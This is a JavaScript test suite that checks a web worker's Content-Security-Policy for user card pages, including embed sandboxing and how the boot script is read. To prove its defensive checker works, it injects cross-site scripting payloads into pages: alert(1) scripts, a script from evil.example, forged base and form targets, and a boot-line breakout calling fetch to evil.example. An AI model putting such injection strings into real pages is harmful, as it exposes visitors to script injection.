// The Content-Security-Policy of a person's page (cardtile-page-csp.mjs), asked of the cardtile worker.
//
// What is proved here, without a browser:
//   · the setting: report-only by default (unset, and every value but two); exactly "enforce" enforces and
//     exactly "off" is off — and off is main's answers, byte for byte (the service-host-off fixture,
//     captured from main with an embed in its files), but for the address of an embed's own document;
//   · report-only and enforce add a header: every body (report-only), status and store read of the same 903
//     is main's; under enforce an embed's frame names its own document;
//   · that address answers in every stage, and only to a frame (Sec-Fetch-Dest iframe or frame): a top-level
//     page, any other destination and a request with no Sec-Fetch-Dest get the empty document;
//   · the STATIC CHECK: on a page holding every tile type, every inline script and every inline
//     event handler the page carries is in the policy by hash, and every address class the page
//     loads from is allowed — and the same check FAILS on a page with one script added;
//   · the policy is on EVERY person's page and preview, whatever it holds: nothing a person writes, and
//     nothing in the rendered page, decides whether it is sent (an embed, the word "embed" in a file
//     served in windows, ` srcdoc="` in the page — the r1 review's cases);
//   · enforced, an embed is its own document (cardtile-embed-document.mjs): its frame names a
//     same-origin address with the same sandbox, that address answers with exactly the document the
//     srcdoc held under a policy of its own, and only for an embed tile of the file it names; report-only
//     and off keep the srcdoc. The address answers alike in every stage (a rollback), and an address the
//     file no longer holds (an edit) is an empty document, never the "no card" page;
//   · the setting leaves every other answer alone, the `.md` exits included (their nosniff is
//     cardtile-md-nosniff.test.mjs, and does not depend on this setting).
// What a browser does with the policy is verify/page-csp.mjs.
import assert from 'node:assert/strict';
import test from 'node:test';
import { createHash } from 'node:crypto';
import worker, { renderCardHTML } from './card-worker.mjs';
import { gridCases, answerOf, answerDiff, atFixedClock, readFixture } from './gen-service-host-off-fixture.mjs';
import vm from 'node:vm';
import { deflateSync, crc32 } from 'node:zlib';
import { pageCspStage, pageCspHeaderName, pagePolicy, pageCspHeaders, bootScriptOf, isBootData,
  videoScript, pictureScript, hashSource, PAGE_HANDLERS, DECK_FILE_ONERROR, ICON_ONERROR, PAGE_CSP_STAGES } from './cardtile-page-csp.mjs';
import { embedDocuments, framesAsDocuments, embedDocumentBody, EMBED_DOC_HEAD, EMBED_DOCUMENT_POLICY } from './cardtile-embed-document.mjs';
import { parseCard } from '../card-core.js';
import { PICTURE_STRATEGIES } from './asset-urls.mjs';
import { WINDOW_TILES } from './size-tier.mjs';
import { GRID_STAGES, GRID_HOSTS, GRID_PREVIEW, GRID_SEED, GRID_EMBED, GRID_EMBED_HASH, wideCases, wideAnswerOf } from './gen-service-host-off-fixture.mjs';
import { DECK_HEAD_JS, DECK_JS_PATH } from '../w3/deck-page.mjs';
import { ON_DEMAND_TILES } from './size-tier.mjs';
import { PNG, EVERY_TILE, PLAIN, WITH_EMBED, HOSTILE_FRONT, long, proseNamingEmbed, wordsNamingEmbed, EMBED_ON_BACK, OTHER_EMBED, RELATIVE_EMBED } from './cardtile-page-csp-fixtures.mjs';

import { BLANKS } from '../ai-ops.mjs';
import { isTemplateOnly } from '../card-blank.mjs';

// a file that is still only the blank template (the starter card-blank-noindex.test.mjs builds)
const BLANK_TEMPLATE = ['---', 'card-page: blank', 'title: Blank', 'theme: light', 'cols: 6', '---', '', '## grid', '',
  `- [ ] %% card: ${BLANKS.profile.type} ${BLANKS.profile.rawParams} %% ${BLANKS.profile.body}`,
  `- [ ] %% card: ${BLANKS.social.type} ${BLANKS.social.rawParams} %%`,
  ...BLANKS.social.body.split('\n').map((l) => `\t${l.trim()}`), ''].join('\n');
const ENFORCED = 'content-security-policy';
const REPORTED = 'content-security-policy-report-only';

const CARDS = { every: EVERY_TILE, plain: PLAIN, embedded: WITH_EMBED, hostile: HOSTILE_FRONT,
  long: long(ON_DEMAND_TILES + 40), longembedded: long(ON_DEMAND_TILES + 40, '- [ ] %% card: embed w=6 %% <script>1</script>\n'),
  prose: proseNamingEmbed(ON_DEMAND_TILES + 1), words: wordsNamingEmbed(ON_DEMAND_TILES + 5), onback: EMBED_ON_BACK, other: OTHER_EMBED,
  aster: RELATIVE_EMBED(DECK_JS_PATH),
  [`_preview:${'c'.repeat(32)}`]: EVERY_TILE, [`_preview:${'d'.repeat(32)}`]: WITH_EMBED, [`_preview:${'f'.repeat(32)}`]: RELATIVE_EMBED(DECK_JS_PATH) };
// the window of `longembedded` that holds its embed (its last tile)
const EMBED_WINDOW = Math.ceil((ON_DEMAND_TILES + 41) / WINDOW_TILES);
const store = () => ({ get: async (k) => CARDS[k] ?? null, async getWithMetadata(k) { return { value: await this.get(k), metadata: null }; } });
// the page WITHOUT the policy is the page asked with the setting "off"; unset is the default, report-only
const OFF = { CARDS_PAGE_CSP: 'off' };
// an embed's address is asked by the embed's frame: the browser sends Sec-Fetch-Dest: iframe (the default's closing
// review — anything else is answered the empty document). A request that names a Sec-Fetch-Dest keeps its own.
const asFrame = (u, init = {}) => (/\/_embed\//.test(String(u)) && !(init.headers && 'sec-fetch-dest' in init.headers)
  ? { ...init, headers: { ...(init.headers || {}), 'sec-fetch-dest': 'iframe' } } : init);
const ask = (path, settings = OFF, init = {}) => worker.fetch(new Request(`http://localhost${path}`, asFrame(path, init)), { CARDS: store(), ...settings });
const ON = { CARDS_PAGE_CSP: 'enforce' };

// ── the static check: an independent reading of a page against a policy ────────────────────────
const sha = (text) => `'sha256-${createHash('sha256').update(text, 'utf8').digest('base64')}'`;
const unescape = (s) => s.replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
const directives = (policy) => Object.fromEntries(String(policy).split(';').map((d) => d.trim().split(/\s+/)).map(([name, ...v]) => [name, v]));
/** everything on `page` that `policy` would refuse, as a list of sentences ([] = the page fits the policy) */
function refusals(page, policy) {
  const d = directives(policy);
  const out = [];
  const script = d['script-src'] || [];
  for (const m of page.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/g)) {
    const src = /\ssrc="([^"]*)"/.exec(m[1]);
    if (src) { if (!(src[1].startsWith('/') && !src[1].startsWith('//') && script.includes("'self'"))) out.push(`script file ${src[1]}`); }
    else if (!script.includes(sha(m[2]))) out.push(`inline script ${JSON.stringify(m[2].slice(0, 60))}`);
  }
  for (const m of page.matchAll(/\son[a-z]+=(?:"([^"]*)"|'([^']*)')/g)) {
    const text = unescape(m[1] ?? m[2]);
    if (!(script.includes("'unsafe-hashes'") && script.includes(sha(text)))) out.push(`inline handler ${JSON.stringify(text.slice(0, 60))}`);
  }
  if (/javascript:/i.test(page)) out.push('a javascript: address');
  for (const tag of ['form', 'base', 'object', 'embed', 'video', 'audio', 'source']) if (new RegExp(`<${tag}\\b`).test(page)) out.push(`a <${tag}>`);
  // a frame: a srcdoc document inherits this policy (its script is refused); a frame by address must be one frame-src allows
  const frame = d['frame-src'] || [];
  for (const m of page.matchAll(/<iframe\b([^>]*)>/g)) {
    if (/\ssrcdoc="/.test(m[1])) { out.push('a srcdoc frame (it inherits this policy)'); continue; }
    const src = (/\ssrc="([^"]*)"/.exec(m[1]) || [])[1] || '';
    const ok = src.startsWith('/') && !src.startsWith('//') ? frame.includes("'self'") : frame.some((h) => /^https:\/\//.test(h) && src.startsWith(`${h}/`));
    if (!ok) out.push(`a frame ${src.slice(0, 60)}`);
  }
  const img = d['img-src'] || [];
  const imgOk = (u) => (u.startsWith('data:') ? img.includes('data:') : /^https:/i.test(u) ? img.includes('https:') : /^http:/i.test(u) ? img.includes('http:')
    : u.startsWith('/') && !u.startsWith('//') ? img.includes("'self'") : false);
  for (const m of page.matchAll(/<img\b[^>]*?\ssrc="([^"]*)"/g)) if (!imgOk(unescape(m[1]))) out.push(`picture ${m[1].slice(0, 60)}`);
  for (const m of page.matchAll(/url\((?:&quot;|["'])?([^)"']*?)(?:&quot;|["'])?\)/g)) if (!imgOk(unescape(m[1]))) out.push(`css picture ${m[1].slice(0, 60)}`);
  for (const m of page.matchAll(/<link\b[^>]*>/g)) {
    const rel = /\srel="([^"]*)"/.exec(m[0])[1]; const href = unescape(/\shref="([^"]*)"/.exec(m[0])[1]);
    if (rel === 'stylesheet' && !(href.startsWith('/') && (d['style-src'] || []).includes("'self'"))) out.push(`stylesheet ${href}`);
    if (/icon|preload/.test(rel) && !imgOk(href)) out.push(`icon ${href}`);
  }
  if (/<style\b/.test(page) && !(d['style-src'] || []).includes("'unsafe-inline'")) out.push('an inline <style>');
  return out;
}

// ── the setting ────────────────────────────────────────────────────────────────────────────────
test('the setting: report-only by default; exactly "enforce" enforces and exactly "off" is off; anything else is the default', () => {
  assert.deepEqual([...PAGE_CSP_STAGES], ['off', 'report-only', 'enforce']);
  assert.equal(pageCspStage({ CARDS_PAGE_CSP: 'report-only' }), 'report-only');
  assert.equal(pageCspStage({ CARDS_PAGE_CSP: 'enforce' }), 'enforce');
  assert.equal(pageCspStage({ CARDS_PAGE_CSP: 'off' }), 'off');
  for (const v of [undefined, null, '', 'on', '1', 'true', true, 1, 0, false, 'Off', 'OFF', ' off', 'off ', 'off\n', 'false', 'none', 'Enforce', 'ENFORCE', ' enforce', 'enforce ', 'enforce\n', 'enforced', 'report', 'report_only', 'Report-Only', 'report-only ', ['enforce'], ['off'], { toString: () => 'off' }]) {
    assert.equal(pageCspStage({ CARDS_PAGE_CSP: v }), 'report-only', `${JSON.stringify(v)} must be the default, report-only`);
  }
  assert.equal(pageCspStage(undefined), 'report-only');
  assert.equal(pageCspStage(null), 'report-only');
  assert.equal(pageCspStage({}), 'report-only');
  assert.equal(pageCspHeaderName('report-only'), 'Content-Security-Policy-Report-Only');
  assert.equal(pageCspHeaderName('enforce'), 'Content-Security-Policy');
  for (const s of ['off', 'toString', '__proto__', undefined]) assert.equal(pageCspHeaderName(s), undefined);
});

test('"off": a person\'s page, a preview, the "no card" pages and the .md exits carry no policy header', async () => {
  for (const path of ['/every', '/plain', `/_preview/${'c'.repeat(32)}`, '/every.md', '/nope', `/_preview/${'9'.repeat(32)}`]) {
    const r = await ask(path, OFF);
    assert.equal(r.status, /nope|9{32}/.test(path) ? 404 : 200, path);
    assert.equal(r.headers.get(ENFORCED), null, path);
    assert.equal(r.headers.get(REPORTED), null, path);
  }
});

// ── what a person's pages carry by default (tile#372: shipped report-only) ───────────────────────
// Every kind of page the Worker serves for a person, with the setting UNSET: the three deck views, a long
// file's window, a preview, the blank template, the rendered "no card" page, the small 404 of a person's own
// domain, an expired preview — each carries the report-only policy and no enforcing one; an embed's own
// document carries ITS policy (enforced: an opaque-origin sandbox — the page's script-src would refuse the
// author's script, see cardtile-embed-document.mjs).
test('unset: every page the Worker serves for a person carries the report-only policy, and none the enforcing one', async () => {
  const seed = { ...CARDS, stack: EVERY_TILE.replace('---\n', '---\nview: stack\n'), list: EVERY_TILE.replace('---\n', '---\nview: list\n'),
    wall: EVERY_TILE.replace('---\n', '---\nview: wall\n'), blank: BLANK_TEMPLATE,
    aster: WITH_EMBED, 'vanity:own.example': 'aster', 'vanityof:aster:0': 'own.example', 'vanitybind:aster:0:own.example': '1' };
  const env = { CARDS: { get: async (k) => seed[k] ?? null, async getWithMetadata(k) { return { value: await this.get(k), metadata: null }; } } };
  const get = (u, init) => worker.fetch(new Request(u, asFrame(u, init)), env);
  const kinds = [
    ['deck: stack view', 'http://localhost/stack', 200], ['deck: list view', 'http://localhost/list', 200], ['deck: wall view', 'http://localhost/wall', 200],
    ['deck: a ?view= switch', 'http://localhost/every?view=list', 200], ['deck: a long file\'s window', `http://localhost/long?w=2`, 200],
    ['deck: HEAD', 'http://localhost/every', 200, { method: 'HEAD' }],
    ['a page with an embed', 'http://localhost/embedded', 200], ['a person\'s own domain', 'https://own.example/', 200],
    ['a preview', `http://localhost/_preview/${'c'.repeat(32)}`, 200], ['the blank template', 'http://localhost/blank', 200],
    ['no card: an unknown handle', 'http://localhost/nobody', 404], ['no card: an unknown path under a handle', 'http://localhost/every/nope', 404],
    ['no card: an own domain\'s unknown path', 'https://own.example/wp-login.php', 404],
    ['an expired preview', `http://localhost/_preview/${'9'.repeat(32)}`, 404],
  ];
  assert.equal(isTemplateOnly(BLANK_TEMPLATE), true, 'control: the blank fixture is the blank template');  const sentOn = [];
  for (const [what, u, status, init] of kinds) {
    const r = await get(u, init);
    assert.equal(r.status, status, `${what}: ${u}`);
    assert.match(r.headers.get('content-type') || '', /^text\/html/, what);
    const policy = r.headers.get(REPORTED);
    assert.ok(policy, `${what}: no report-only policy`);
    assert.equal(r.headers.get(ENFORCED), null, `${what}: an enforcing policy`);
    const d = directives(policy);
    for (const [k, v] of [['object-src', ["'none'"]], ['base-uri', ["'none'"]], ['default-src', ["'none'"]], ['frame-src', ["'self'", 'https://www.youtube-nocookie.com']]]) {
      assert.deepEqual(d[k], v, `${what}: ${k}`);
    }
    assert.equal(d['frame-ancestors'], undefined, `${what}: frame-ancestors (today any site may frame a page)`);
    assert.equal(d['report-uri'] ?? d['report-to'], undefined, `${what}: a report endpoint (this Worker has none)`);
    // report-only keeps an embed srcdoc (the default's review): the one thing the policy would report on such a page is
    // that frame — its script runs, and the browser reports it; under "enforce" the embed is its own document instead
    const expected = ['a page with an embed', 'a person\'s own domain'].includes(what) ? ['a srcdoc frame (it inherits this policy)'] : [];   // both hold WITH_EMBED
    if (r.status === 200 && init?.method !== 'HEAD') assert.deepEqual(refusals(await r.text(), policy), expected, `${what}: the page does not fit its own policy`);
    sentOn.push(what);
  }
  // the embed: by default a srcdoc frame, as with the setting off (report-only refuses nothing, so its script runs);
  // the document a page loaded under "enforce" names answers by default too, under its own policy
  const page = await (await get('http://localhost/embedded')).text();
  const [f] = framesOf(page);
  assert.ok(f && f.srcdoc && !f.src && !page.includes('/_embed/'), 'by default an embed is a srcdoc frame');
  const [e] = framesOf(await (await worker.fetch(new Request('http://localhost/embedded'), { ...env, ...ON })).text());
  const doc = await get(`http://localhost${e.src}`);
  assert.equal(doc.status, 200);
  assert.equal(doc.headers.get(ENFORCED), EMBED_DOCUMENT_POLICY);
  assert.equal(doc.headers.get('x-content-type-options'), 'nosniff');
  // …and the markdown exits: nosniff, no page policy
  for (const u of ['http://localhost/every.md']) {
    const md = await get(u);
    assert.equal(md.headers.get('x-content-type-options'), 'nosniff', u);
    assert.equal(md.headers.get(REPORTED), null, u);
  }
  console.log(`# cardtile page csp default: ${sentOn.length} page kinds carry the report-only policy: ${sentOn.join(' | ')}`);
});

test('report-only sends the policy in the report-only header alone; enforce in the enforcing header alone; the text is one text', async () => {
  for (const path of ['/every', '/plain', `/_preview/${'c'.repeat(32)}`]) {
    const reported = await ask(path, { CARDS_PAGE_CSP: 'report-only' });
    const enforced = await ask(path, ON);
    assert.equal(reported.headers.get(ENFORCED), null, path);
    assert.equal(enforced.headers.get(REPORTED), null, path);
    assert.ok(reported.headers.get(REPORTED), `${path}: no report-only header`);
    assert.equal(enforced.headers.get(ENFORCED), reported.headers.get(REPORTED), path);
    // …and the page itself is the page served with the setting unset
    const [a, b, c] = await Promise.all([reported.text(), enforced.text(), (await ask(path)).text()]);
    assert.equal(a, c, `${path}: report-only changed the body`);
    assert.equal(b, c, `${path}: enforce changed the body`);
  }
});

test('the policy text, whole', async () => {
  const policy = (await ask('/plain', ON)).headers.get(ENFORCED);
  const page = await (await ask('/plain')).text();
  assert.equal(policy, [
    "default-src 'none'",
    `script-src 'self' ${sha(DECK_HEAD_JS)} ${sha(videoScript())} ${sha(bootScriptOf(page))} 'unsafe-hashes' ${sha(ICON_ONERROR)} ${sha(DECK_FILE_ONERROR)}`,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https: http:",
    "connect-src 'self'",
    "frame-src 'self' https://www.youtube-nocookie.com",
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'none'",
  ].join('; '));
  const d = directives(policy);
  for (const banned of ["'unsafe-inline'", "'unsafe-eval'", "'strict-dynamic'", '*', 'https:', 'http:', 'data:', 'blob:']) assert.ok(!d['script-src'].includes(banned), `script-src holds ${banned}`);
  assert.ok(!d['script-src'].some((s) => s.startsWith("'nonce-")), 'a nonce in a cached page is one nonce for every visitor');
  assert.ok(!('frame-ancestors' in d) && !('report-uri' in d) && !('report-to' in d));
  assert.equal(pagePolicy(), "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https: http:; connect-src 'self'; frame-src 'self' https://www.youtube-nocookie.com; object-src 'none'; base-uri 'none'; form-action 'none'");
});

// ── the static check ───────────────────────────────────────────────────────────────────────────
test('STATIC CHECK: every inline script, inline handler and address class of a page with every tile type fits its policy', async () => {
  for (const [path, settings] of [['/every', ON], ['/every?lang=ja', ON], ['/plain', ON], ['/hostile', ON], ['/long', ON], ['/long?w=2', ON], [`/_preview/${'c'.repeat(32)}`, ON],
    ['/embedded', ON], ['/onback', ON], [`/_preview/${'d'.repeat(32)}`, ON], [`/longembedded?w=${EMBED_WINDOW}`, ON], ['/prose', ON], ['/words?w=5', ON],
    ['/every', { ...ON, CARD_CANONICAL_HOST: 'reef.cards', CARDS_SERVICE_HOST: 'cards.feelreef.com' }]]) {
    const host = settings.CARD_CANONICAL_HOST ? 'https://reef.cards' : 'http://localhost';
    const r = await worker.fetch(new Request(`${host}${path}`, { redirect: 'manual' }), { CARDS: store(), ...settings });
    assert.equal(r.status, 200, path);
    const policy = r.headers.get(ENFORCED);
    assert.ok(policy, `${path}: no policy`);
    const page = await r.text();
    assert.deepEqual(refusals(page, policy), [], path);
    // the page did carry what the check is about
    assert.ok((page.match(/<script>/g) || []).length >= 2, `${path}: fewer than two inline scripts`);
    assert.ok(page.includes(` onerror="${DECK_FILE_ONERROR}"`), `${path}: the deck file's handler is not the one the policy hashes`);
  }
  const every = await (await ask('/every')).text();
  // the fixture reaches each thing the policy names: a mark with a handler, the video script, each picture class, a style of every kind
  assert.ok(every.includes(" onerror='"), 'no brand mark with a handler on the page');
  assert.ok(every.includes(videoScript()), 'no video script on the page');
  for (const needle of ['src="data:image/png', 'https://pictures.example/me.png', 'http://pictures.example/plain.jpg', 'src="/_icon/', 'src="/_yt/', 'url(', '<style id="cp-accent">', 'st-backdrop'])
    assert.ok(every.includes(needle), `the fixture page does not hold ${needle}`);
  const handlers = new Set([...every.matchAll(/\son[a-z]+=(?:"([^"]*)"|'([^']*)')/g)].map((m) => unescape(m[1] ?? m[2])));
  assert.deepEqual([...handlers].sort(), [...PAGE_HANDLERS].sort(), 'the page carries exactly the two handlers the policy knows');
});

test('CONTROL: the static check refuses a page with one script, one handler or one frame more than the renderer wrote', async () => {
  const page = await (await ask('/every')).text();
  const env = { ...ON };
  const policyOf = async (p) => (await pageCspHeaders(env, p))['Content-Security-Policy'];
  assert.deepEqual(refusals(page, await policyOf(page)), []);
  for (const [what, added, sentence] of [
    ['an inline script in the body', '<script>alert(1)</script>', /inline script "alert\(1\)"/],
    ['a script file from elsewhere', '<script src="https://evil.example/x.js"></script>', /script file https:\/\/evil\.example/],
    ['a handler', '<img src="/x" onerror="alert(1)">', /inline handler "alert\(1\)"/],
    ['a javascript: link', '<a href="javascript:alert(1)">x</a>', /javascript:/],
    ['a base', '<base href="https://evil.example/">', /a <base>/],
    ['a form', '<form action="https://evil.example/"></form>', /a <form>/],
    ['an object', '<object data="https://evil.example/x"></object>', /a <object>/],
    ['a frame from elsewhere', '<iframe src="https://evil.example/"></iframe>', /a frame https:\/\/evil\.example/],
    ['a srcdoc frame', '<iframe sandbox="allow-scripts" srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>', /a srcdoc frame/],
  ]) {
    const tampered = page.replace('<main', `${added}<main`);
    assert.notEqual(tampered, page, what);
    const bad = refusals(tampered, await policyOf(tampered));
    assert.ok(bad.some((s) => sentence.test(s)), `${what}: not refused (${JSON.stringify(bad)})`);
  }
  // a script written where the boot line stands is not taken for the boot line
  const at = page.lastIndexOf(`<script src="${DECK_JS_PATH}"`);
  const beside = `${page.slice(0, at)}<script>alert(1)</script>${page.slice(at)}`;
  assert.equal(bootScriptOf(beside), null);
  assert.ok(refusals(beside, await policyOf(beside)).some((s) => /alert\(1\)/.test(s)));
});

// ── the boot line ──────────────────────────────────────────────────────────────────────────────
test('the boot line is read by position, and only as data', async () => {
  for (const path of ['/every', '/plain', '/hostile', '/every?lang=ja', '/long?w=2']) {
    const page = await (await ask(path)).text();
    const boot = bootScriptOf(page);
    assert.ok(boot, `${path}: no boot line`);
    assert.ok(page.endsWith(`<script>${boot}</script><script src="${DECK_JS_PATH}" onerror="${DECK_FILE_ONERROR}"></script></body></html>`), path);
    assert.ok(boot.startsWith('window.__cardFront='), path);
  }
  // what a person aims at it stays inside a string
  const hostile = bootScriptOf(await (await ask('/hostile')).text());
  const front = JSON.parse(/^window\.__cardFront=("(?:[^"\\]|\\.)*");/.exec(hostile)[1]);
  assert.ok(front.includes('</script><script>alert(4)//') && front.includes('alert(3)'), 'the hostile values are in the fence, as text');
  assert.ok(!hostile.includes('<'));

  assert.equal(isBootData('window.__a="x";'), true);
  assert.equal(isBootData('window.__a="x";window.__b={"k":["v",1,true,null,{"q":"}\\"];"}]};window.__c=false;'), true);
  for (const code of ['', 'alert(1)', 'window.__a="x";alert(1);', 'window.__a="x"', 'window.__a="x";;', 'window.__a=alert(1);', 'window.__a="x"+alert(1);', 'window.__a={"k":alert(1)};',
    'window.__a=[alert(1)];', 'window.__a="x";\nalert(1);', 'window.a="x";', 'window.__a="x";//', 'window.__a="</script>";', 'window.__a=`x`;', "window.__a='x';", 'window.__a=function(){};',
    'window.__a={k:1};', 'window.__a="x\n";', 'window.__a=1;window.__proto__.x=1;', 'top.__a="x";', 'window.__a="x";window.__b=', 'window.__a="\\";alert(1);//";alert(2);']) {
    assert.equal(isBootData(code), false, `taken for data: ${JSON.stringify(code)}`);
  }
  // a breakout from the boot line's own string would be code in the boot line: it is not hashed
  const page = await (await ask('/plain')).text();
  const boot = bootScriptOf(page);
  const broken = page.replace(`<script>${boot}</script>`, () => `<script>${boot.replace('window.__cardFront="', 'window.__cardFront="";fetch("//evil.example");"')}</script>`);
  assert.notEqual(broken, page);
  assert.equal(bootScriptOf(broken), null);
  const policy = (await pageCspHeaders(ON, broken))['Content-Security-Policy'];
  assert.ok(refusals(broken, policy).some((s) => /inline script "window\.__cardFront=\\"\\";fetch/.test(s)), 'the broken boot line is refused');
  // a page that does not end as withDeck ends one has no boot line
  assert.equal(bootScriptOf('<script>window.__a="x";</script></body></html>'), null);
  assert.equal(bootScriptOf(`${page}<!-- -->`), null);
  assert.equal(bootScriptOf(''), null);
});

test('with the service on its own host the re-addressed boot line is the one hashed', async () => {
  const env = { CARDS: store(), ...ON, CARD_CANONICAL_HOST: 'reef.cards', CARDS_SERVICE_HOST: 'cards.feelreef.com' };
  const r = await worker.fetch(new Request('https://reef.cards/plain'), env);
  const policy = r.headers.get(ENFORCED);
  const page = await r.text();
  const boot = bootScriptOf(page);
  assert.ok(boot.includes('window.__deckTry="https://cards.feelreef.com/try/edit";'));
  assert.ok(directives(policy)['script-src'].includes(sha(boot)));
});

test('the renderer\'s own scripts are read from the renderer, and the after-paint script follows its prefix', async () => {
  assert.ok(videoScript().includes('youtube-nocookie.com/embed/'));
  assert.equal(pictureScript(''), null);
  assert.equal(pictureScript('/x/a/"]);alert(1)//'), null, 'a prefix the renderer would refuse writes no script');
  const page = renderCardHTML(PLAIN, { handle: 'plain', cardUrl: 'https://card.feelreef.com/plain', pictures: { afterPaint: '/plain/a/' } });
  assert.ok(page.includes(`<script>${pictureScript('/plain/a/')}</script>`), 'the script the renderer wrote is the one this module expects');
  const without = (await pageCspHeaders(ON, page))['Content-Security-Policy'];
  assert.ok(refusals(page, without).some((s) => /inline script "addEventListener/.test(s)), 'CONTROL: without the prefix the after-paint script is not in the policy');
  const policy = (await pageCspHeaders(ON, page, { afterPaint: '/plain/a/' }))['Content-Security-Policy'];
  assert.deepEqual(refusals(page, policy), []);
  assert.equal(await hashSource('x'), sha('x'));
});

// a real PNG past the inline threshold (asset-urls.mjs INLINE_MAX_BYTES): rows of bytes that do not compress
const bigPng = (seed) => {
  const chunk = (type, data) => { const len = Buffer.alloc(4); len.writeUInt32BE(data.length); const td = Buffer.concat([Buffer.from(type), data]); const c = Buffer.alloc(4); c.writeUInt32BE(crc32(td)); return Buffer.concat([len, td, c]); };
  const w = 32, h = 32;
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2;
  const raw = Buffer.alloc(h * (1 + 3 * w));
  let x = seed;
  for (let i = 0; i < raw.length; i += 1) { x = (x * 1103515245 + 12345) >>> 0; raw[i] = i % (1 + 3 * w) === 0 ? 0 : x >>> 24; }
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk('IHDR', ihdr), chunk('IDAT', deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
};
test('the local picture switch: a page whose pictures travel by address still fits its policy, in every strategy', async () => {
  // four pictures of the file's own, past the inline threshold: the first screen takes two, the rest go by address
  const pics = [1, 2, 3, 4].map((i) => ({ id: `pic${i}`, b: bigPng(i) }));
  assert.ok(pics.every((p) => p.b.length > 1024), 'the pictures are past the inline threshold');
  const withAssets = `${EVERY_TILE.replace(`img=${PNG}`, 'img=asset:pic1').replace('## back: about',
    '- [ ] %% card: feature w=6 img=asset:pic2 %% Two.\n- [ ] %% card: feature w=6 img=asset:pic3 %% Three.\n- [ ] %% card: feature w=6 img=asset:pic4 %% Four.\n\n## back: about')}\n## assets\n\n${pics.map((p) => `- [ ] %% card: asset id=${p.id} mime=image/png %% ${p.b.toString('base64')}`).join('\n')}\n`;
  assert.equal(parseCard(withAssets).assets.pic4 != null, true, 'the assets lane parses');
  const seen = [];
  for (const mode of PICTURE_STRATEGIES) {
    const env = { CARDS: { ...store(), get: async (k) => (k === 'every' ? withAssets : CARDS[k] ?? null) }, ...ON, CARDTILE_PICTURES: mode };
    const r = await worker.fetch(new Request('http://localhost/every'), env);
    const page = await r.text();
    assert.equal(r.status, 200, mode);
    const policy = r.headers.get(ENFORCED);
    assert.deepEqual(refusals(page, policy), [], `CARDTILE_PICTURES=${mode}`);
    const byAddress = (page.match(/\/every\/a\/[0-9a-f]{64}\.png/g) || []).length;
    const afterPaint = pictureScript('/every/a/');
    // the switch did switch: by address for every strategy but inline, and the after-paint script exactly where asked
    if (mode === 'inline') assert.equal(byAddress, 0, mode);
    else assert.ok(byAddress > 0, `${mode}: no picture by address`);
    assert.equal(page.includes(`<script>${afterPaint}</script>`), mode.endsWith('-after-paint'), `${mode}: the after-paint script`);
    if (mode.endsWith('-after-paint')) assert.ok(directives(policy)['script-src'].includes(sha(afterPaint)), `${mode}: the after-paint script is not in the policy`);
    seen.push(`${mode}:${byAddress}`);
  }
  console.log(`# picture switch: ${seen.join(' ')}`);
});

// ── the embed ──────────────────────────────────────────────────────────────────────────────────
test('the policy is on EVERY person\'s page and preview, whatever it holds (r1: an embed, the word "embed", a window)', async () => {
  const words = Math.ceil((ON_DEMAND_TILES + 5) / WINDOW_TILES);
  const longEmbedded = Array.from({ length: EMBED_WINDOW }, (_, i) => `/longembedded?w=${i + 1}`);
  const prose = Array.from({ length: Math.ceil((ON_DEMAND_TILES + 1) / WINDOW_TILES) }, (_, i) => `/prose?w=${i + 1}`);
  const paths = ['/embedded', '/onback', `/_preview/${'d'.repeat(32)}`, '/longembedded', ...longEmbedded, '/prose', ...prose,
    '/words', ...Array.from({ length: words }, (_, i) => `/words?w=${i + 1}`)];
  let sent = 0;
  for (const path of paths) {
    const plain = (await ask('/plain', ON)).headers.get(ENFORCED);
    for (const stage of ['report-only', 'enforce']) {
      const r = await ask(path, { CARDS_PAGE_CSP: stage });
      assert.equal(r.status, 200, path);
      const policy = r.headers.get(pageCspHeaderName(stage));
      assert.ok(policy, `${path} ${stage}: no policy`);
      // the same policy as any page, but for the page's own boot line
      const strip = (p) => p.replace(/'sha256-[^']*'/g, 'H');
      assert.equal(strip(policy), strip(plain), `${path} ${stage}: not the policy every page gets`);
      sent += 1;
    }
  }
  console.log(`# cardtile page csp: ${sent} answers of ${paths.length} pages with an embed or the word, all with the policy`);
  // the review's exact case: a file served in windows whose title says "embed", and no frame anywhere
  assert.ok(CARDS.prose.includes('title: How to embed a video'));
  assert.ok(!(await (await ask('/prose', ON)).text()).includes('<iframe'));
});

test('r1 (third review): ` srcdoc="` in an injected payload does not take the policy away, and the injected script is refused', async () => {
  const page = await (await ask('/plain')).text();
  const tampered = page.replace('<main', '<script>alert(1)</script><!-- srcdoc=" --><main');
  assert.notEqual(tampered, page);
  const headers = await pageCspHeaders(ON, tampered);
  assert.ok(headers['Content-Security-Policy'], 'no policy for a page holding the string');
  assert.ok(refusals(tampered, headers['Content-Security-Policy']).some((s) => /inline script "alert\(1\)"/.test(s)));
  // …and a frame an escaping bug writes is not an embed: it is left as it is, and inherits the policy
  const forged = page.replace('<main', '<iframe sandbox="allow-scripts" srcdoc="&lt;script&gt;parent.x=1&lt;/script&gt;"></iframe><main');
  const docs = await embedDocuments(parseCard(PLAIN), () => '');
  assert.equal(framesAsDocuments(forged, docs, '/plain/'), forged);
  assert.ok(refusals(forged, (await pageCspHeaders(ON, forged))['Content-Security-Policy']).some((s) => /srcdoc frame/.test(s)));
});

/** the frames of a page: [{ attrs, src, srcdoc }] */
const framesOf = (page) => [...page.matchAll(/<iframe\b([^>]*)>/g)].map((m) => ({ attrs: m[1], src: (/\ssrc="([^"]*)"/.exec(m[1]) || [])[1], srcdoc: (/\ssrcdoc="([^"]*)"/.exec(m[1]) || [])[1] }));
const fromSrcdoc = (s) => s.replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
